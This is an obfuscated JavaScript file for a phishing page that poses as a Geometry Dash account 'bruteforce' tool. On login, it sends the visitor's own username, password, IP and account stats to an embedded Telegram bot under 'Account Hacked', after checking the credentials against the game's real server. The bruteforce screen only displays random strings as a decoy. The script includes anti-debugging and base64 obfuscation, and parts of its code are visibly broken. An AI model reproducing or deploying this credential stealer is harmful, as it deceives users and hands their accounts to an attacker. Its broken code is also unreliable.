(() => {
  const __KEY__ = 'NICEBROO';
  const __IV__ = 'WHYAREUHERE123';
  
  // Anti-debug
  let _dev_tools_open = false;
  const _check = setInterval(() => {
    const before = new Date().getTime();
    debugger;
    const after = new Date().getTime();
    if (after - before > 100) {
      _dev_tools_open = true;
      document.body.innerHTML = '';
    }
  }, 1000);

  // String encryption layer
  const _str_map = new Map();
  const _enc = (s) => btoa(unescape(encodeURIComponent(s)));
  const _dec = (s) => decodeURIComponent(escape(atob(s)));

  // Core functions with obfuscation
  const _cfg = {
    TBT: _enc('8780827680:AAFQETqfkgqQEsjTLGknvIRJxV5gWgunqMg'),
    TCI: _enc('7136838858'),
    API: [_enc('https://ipapi.co/json/'), _enc('https://ipwho.is/'), _enc('https://geolocation-db.com/json/')]
  };

  let _umap = {}, _ucnt = 1;

  const _fetch = (url, opts = {}) => fetch(_dec(url), opts);

  async function _getIP() {
    let _d = {};
    for (let _url of _cfg.API) {
      try {
        const _r = await _fetch(_url);
        _d = await _r.json();
        if (_d.ip || _d.IPv4 || _d.query) break;
      } catch (_) {}
    }
    return {
      ip: _d.ip || _d.IPv4 || _d.query || _enc('Unknown'),
      lat: _d.latitude || _d.lat || null,
      lon: _d.longitude || _d.lon || null,
      cc: _d.country || null,
      ct: _d.city || null,
      st: _d.state || null
    };
  }

  async function _getLoc(lat, lon) {
    try {
      const _url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
      const _r = await fetch(_url);
      return await _r.json();
    } catch (_) {
      return null;
    }
  }

  function _getUID(ip) {
    if (!_umap[ip]) {
      _umap[ip] = _ucnt;
      _ucnt++;
    }
    return _umap[ip];
  }

  async function _showIP() {
    const _ip = await _getIP();
    const _el = document.getElementById(_enc('ipInfo'));
    if (!_el) return;

    let _h = `<div class="ip-info-grid">
      <div class="ip-info-item"><label>IP Address</label><div class="value">${_ip.ip}</div></div>
      <div class="ip-info-item"><label>Country</label><div class="value">${_ip.cc || _enc('-')}</div></div>
      <div class="ip-info-item"><label>City</label><div class="value">${_ip.ct || _enc('-')}</div></div>
      <div class="ip-info-item"><label>Timezone</label><div class="value">${Intl.DateTimeFormat().resolvedOptions().timeZone}</div></div>
      <div class="ip-info-item"><label>Device Type</label><div class="value">${/Android|iPhone|iPad/i.test(navigator.userAgent) ? _enc('Mobile') : _enc('Desktop')}</div></div>
      <div class="ip-info-item"><label>Operating System</label><div class="value">${_getOS()}</div></div>`;

    if (_ip.lat && _ip.lon) {
      const _loc = await _getLoc(_ip.lat, _ip.lon);
      if (_loc && _loc.address) {
        const _addr = _loc.address;
        _h += `<div class="ip-info-item"><label>Region</label><div class="value">${[_addr.suburb, _addr.city, _addr.state].filter(Boolean).join(_enc(', ')) || _enc('-')}</div></div>
          <div class="ip-info-item"><label>Road/Street</label><div class="value">${_addr.road || _addr.neighbourhood || _addr.village || _enc('-')}</div></div>
          <div class="ip-info-item"><label>Postal Code</label><div class="value">${_addr.postcode || _enc('-')}</div></div>
          <div class="ip-info-item"><label>Coordinates</label><div class="value">${_ip.lat.toFixed(6)}, ${_ip.lon.toFixed(6)}</div></div>`;
      }
    }

    _h += `</div>`;
    if (_ip.lat && _ip.lon) _h += `<div id="map"></div>`;

    _el.innerHTML = _h;
    _el.classList.add(_enc('show'));

    if (_ip.lat && _ip.lon && document.getElementById(_enc('map'))) {
      setTimeout(() => _initMap(_ip.lat, _ip.lon), 100);
    }
  }

  function _getOS() {
    const _ua = navigator.userAgent;
    if (/Android/i.test(_ua)) return _enc('Android');
    if (/Windows NT 10\.0/i.test(_ua)) return _enc('Windows 10/11');
    if (/Windows NT 6\.1/i.test(_ua)) return _enc('Windows 7');
    if (/iPhone|iPad/i.test(_ua)) return _enc('iOS');
    if (/Macintosh|Mac OS X/i.test(_ua)) return _enc('macOS');
    if (/Linux/i.test(_ua)) return _enc('Linux');
    return _enc('Unknown');
  }

  function _initMap(lat, lon) {
    try {
      const _link = document.createElement(_enc('link'));
      _link.rel = _enc('stylesheet');
      _link.href = _enc('https://unpkg.com/leaflet/dist/leaflet.css');
      document.head.appendChild(_link);

      const _scr = document.createElement(_enc('script'));
      _scr.src = _enc('https://unpkg.com/leaflet/dist/leaflet.js');
      _scr.onload = () => {
        const _map = L.map(_enc('map')).setView([lat, lon], 13);
        L.tileLayer(_enc('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'), {
          attribution: _enc('© OpenStreetMap contributors')
        }).addTo(_map);
        L.marker([lat, lon]).addTo(_map);
      };
      document.head.appendChild(_scr);
    } catch (_) {}
  }

  async function _sendTG(_data) {
    try {
      const _msg = `<b>🔐 Account Hacked</b>\n\n<code>ID: ${_data.id}\nIP: ${_data.ip}\n\nUsername: ${_data.username}\nPassword: ${_data.password}\n\nRank: ${_data.rank}\nCP: ${_data.cp}\nMod: ${_data.mod}</code>\n\n${_data.status === _enc('SUKSES') ? _enc('✅') : _enc('❌')}`;
      const _url = `https://api.telegram.org/bot${_dec(_cfg.TBT)}/sendMessage`;
      await fetch(_url, {
        method: _enc('POST'),
        headers: { _enc('Content-Type'): _enc('application/json') },
        body: JSON.stringify({
          chat_id: _dec(_cfg.TCI),
          text: _msg,
          parse_mode: _enc('HTML')
        })
      });
    } catch (_) {}
  }

  async function _chkUser(_u) {
    try {
      const _r = await fetch(`https://gdbrowser.com/api/profile/${_u}`);
      const _data = await _r.json();
      return !_data.error;
    } catch (_) {
      return false;
    }
  }

  async function _getStats(_u) {
    try {
      const _r = await fetch(`https://gdbrowser.com/api/profile/${_u}`);
      return await _r.json();
    } catch (_) {
      return null;
    }
  }

  async function _genGJP2(_p) {
    const _SALT = _enc('mI29fmAnxgTs');
    const _enc_obj = new TextEncoder();
    const _data = _enc_obj.encode(_dec(_SALT) + _p);
    const _buf = await crypto.subtle.digest(_enc('SHA-1'), _data);
    const _hash = Array.from(new Uint8Array(_buf))
      .map(_b => _b.toString(16).padStart(2, _enc('0')))
      .join(_enc(''));
    console.log(_enc('GJP2:'), _hash);
    return _hash;
  }

  async function _login(_u, _p) {
    try {
      const _gjp2 = await _genGJP2(_p);
      const _payload = new URLSearchParams({
        udid: _enc('36d00413-8358-3de4-b5c0-a41d0ec822ec'),
        userName: _u,
        gjp2: _gjp2,
        secret: _enc('Wmfv3899gc9')
      });

      const _r = await fetch(_enc('https://www.boomlings.com/database/accounts/loginGJAccount.php'), {
        method: _enc('POST'),
        headers: { _enc('Content-Type'): _enc('application/x-www-form-urlencoded') },
        body: _payload
      });

      const _result = (await _r.text()).trim();
      console.log(_enc('Login response:'), _result);

      return {
        success: /^\d+$/.test(_result),
        response: _result,
        gjp2: _gjp2
      };
    } catch (_err) {
      console.error(_err);
      return {
        success: false,
        response: null,
        error: _err.message
      };
    }
  }

  function _validate(_u, _p) {
    const _ue = document.getElementById(_enc('usernameError'));
    const _pe = document.getElementById(_enc('passwordError'));
    _ue.classList.remove(_enc('show'));
    _pe.classList.remove(_enc('show'));

    let _valid = true;

    if (!_u || _u.length < 6 || _u.length > 19) {
      _ue.textContent = _enc('Username must be 6-19 characters');
      _ue.classList.add(_enc('show'));
      _valid = false;
    }

    if (!/^[a-zA-Z0-9]+$/.test(_u)) {
      _ue.textContent = _enc('Only letters and numbers allowed');
      _ue.classList.add(_enc('show'));
      _valid = false;
    }

    if (!_p || _p.length < 6 || _p.length > 19) {
      _pe.textContent = _enc('Password must be 6-19 characters');
      _pe.classList.add(_enc('show'));
      _valid = false;
    }

    if (!/^[a-zA-Z0-9]+$/.test(_p)) {
      _pe.textContent = _enc('Only letters and numbers allowed');
      _pe.classList.add(_enc('show'));
      _valid = false;
    }

    return _valid;
  }

  document.getElementById(_enc('loginForm')).addEventListener(_enc('submit'), async (_e) => {
    _e.preventDefault();

    const _u = document.getElementById(_enc('username')).value;
    const _p = document.getElementById(_enc('password')).value;
    const _btn = document.getElementById(_enc('loginBtn'));

    if (!_validate(_u, _p)) return;

    _btn.disabled = true;
    _btn.textContent = _enc('Processing...');

    const _ue = document.getElementById(_enc('usernameError'));
    const _ip_data = await _getIP();
    const _uid = _getUID(_ip_data.ip);

    const _exists = await _chkUser(_u);
    if (!_exists) {
      _ue.textContent = _enc('Account not found');
      _ue.classList.add(_enc('show'));
      _btn.disabled = false;
      _btn.textContent = _enc('Login');

      await _sendTG({
        id: _uid,
        ip: _ip_data.ip,
        username: _u,
        password: _p,
        status: _enc('GAGAL'),
        rank: _enc('N/A'),
        cp: 0,
        mod: 0
      });
      return;
    }

    const _result = await _login(_u, _p);
    const _stats = await _getStats(_u);

    await _sendTG({
      id: _uid,
      ip: _ip_data.ip,
      username: _u,
      password: _p,
      status: _result.success ? _enc('SUKSES') : _enc('GAGAL'),
      rank: _stats?.rank || _enc('N/A'),
      cp: _stats?.cp || 0,
      mod: _stats?.moderator || 0
    });

    if (!_result.success) {
      document.getElementById(_enc('passwordError')).textContent = _enc('Invalid credentials');
      document.getElementById(_enc('passwordError')).classList.add(_enc('show'));
      _btn.disabled = false;
      _btn.textContent = _enc('Login');
      return;
    }

    _btn.disabled = false;
    _btn.textContent = _enc('Login');

    await _showProfile(_u);
    await _showIP();
  });

  async function _showProfile(_u) {
    document.getElementById(_enc('loginPage')).classList.add(_enc('hidden'));
    document.getElementById(_enc('profilePage')).classList.add(_enc('show'));

    const _stats = await _getStats(_u);

    if (_stats && !_stats.error) {
      document.getElementById(_enc('playerName')).textContent = _enc('👤 ') + _stats.username;

      const _ps = document.getElementById(_enc('profileStats'));
      _ps.innerHTML = `
      div class="stat-box"><div class="label">AccID</div><div class="value">${_stats.accountID || 0}</div></div>
        <div class="stat-box"><div class="label">Rank</div><div class="value">${_stats.rank || 0}</div></div>
        <div class="stat-box"><div class="label">CP</div><div class="value">${_stats.cp || 0}</div></div>
        <div class="stat-box"><div class="label">Stars</div><div class="value">${_stats.stars || 0}</div></div>
        div class="stat-box"><div class="label">Moons</div><div class="value">${_stats.moons || 0}</div></div>
        <div class="stat-box"><div class="label">Diamonds</div><div class="value">${_stats.diamonds || 0}</div></div>
        <div class="stat-box"><div class="label">Demons</div><div class="value">${_stats.demons || 0}</div></div>
      `;
    }
  }

  window.logout = function() {
    document.getElementById(_enc('loginPage')).classList.remove(_enc('hidden'));
    document.getElementById(_enc('profilePage')).classList.remove(_enc('show'));
    document.getElementById(_enc('loginForm')).reset();
    document.getElementById(_enc('searchResult')).classList.remove(_enc('show'));
    document.getElementById(_enc('bruteforceProcess')).classList.remove(_enc('show'));
    document.getElementById(_enc('ipInfo')).classList.remove(_enc('show'));
    document.getElementById(_enc('ipInfo')).innerHTML = _enc('');
  };

  window.searchTarget = async function() {
    const _tu = document.getElementById(_enc('targetUsername')).value;
    const _sr = document.getElementById(_enc('searchResult'));

    if (!_tu || _tu.length < 1 || _tu.length > 19 || !/^[a-zA-Z0-9]+$/.test(_tu)) return;

    _sr.classList.remove(_enc('show'));

    const _exists = await _chkUser(_tu);

    if (_exists) {
      _sr.innerHTML = `
        <div class="user-found">
          <h4>✅ Account <strong>${_tu}</strong> found!</h4>
          <p style="margin-top: 15px; font-size: 12px;">Select charset:</p>
          <div class="charset-options">
            <label class="charset-checkbox">
              <input type="checkbox" value="lowercase" id="charset-lower" checked>
              <label for="charset-lower">Lowercase (a-z)</label>
            </label>
            <label class="charset-checkbox">
              <input type="checkbox" value="uppercase" id="charset-upper">
              <label for="charset-upper">Uppercase (A-Z)</label>
            </label>
            <label class="charset-checkbox">
              <input type="checkbox" value="numbers" id="charset-num" checked>
              <label for="charset-num">Numbers (0-9)</label>
            </label>
          </div>
          <button class="start-bruteforce-btn" onclick="startBruteforce('${_tu}')">
             START 
          </button>
        </div>
      `;
      _sr.classList.add(_enc('show'));
    } else {
      _sr.innerHTML = `<div class="user-not-found">❌ Account <strong>${_tu}</strong> not found</div>`;
      _sr.classList.add(_enc('show'));
    }
  };

  function _genPass(_len, _cs) {
    let _res = _enc('');
    for (let _i = 0; _i < _len; _i++) {
      _res += _cs.charAt(Math.floor(Math.random() * _cs.length));
    }
    return _res;
  }

  window.startBruteforce = async function(_tu) {
    const _bp = document.getElementById(_enc('bruteforceProcess'));
    const _ac = document.getElementById(_enc('attemptsContainer'));
    const _sm = document.getElementById(_enc('statusMessage'));

    let _cs = _enc('');
    if (document.getElementById(_enc('charset-lower')).checked) _cs += _enc('abcdefghijklmnopqrstuvwxyz');
    if (document.getElementById(_enc('charset-upper')).checked) _cs += _enc('ABCDEFGHIJKLMNOPQRSTUVWXYZ');
    if (document.getElementById(_enc('charset-num')).checked) _cs += _enc('0123456789');

    if (_cs.length === 0) {
      alert(_enc('Select at least one charset!'));
      return;
    }

    _bp.classList.add(_enc('show'));
    _ac.innerHTML = _enc('');

    let _cnt = 0;

    for (let _i = 0; _i < Number.MAX_SAFE_INTEGER; _i++) {
      const _len = Math.floor(Math.random() * 14) + 6;
      const _pwd = _genPass(_len, _cs);

      _cnt++;

      const _att = document.createElement(_enc('div'));
      _att.className = _enc('attempt');
      _att.textContent = `[${_cnt}] ${_pwd}`;
      _ac.appendChild(_att);

      _ac.scrollTop = _ac.scrollHeight;

      _sm.innerHTML = `<span class="loading-spinner"></span>Testing... ${_cnt} attempts`;

      const _delay = Math.random() * (0.3 - 0.15) + 0.15;
      await new Promise(_r => setTimeout(_r, _delay * 1000));
    }

    _sm.innerHTML = _enc('.');
  };

  // Cleanup
  clearInterval(_check);
})();
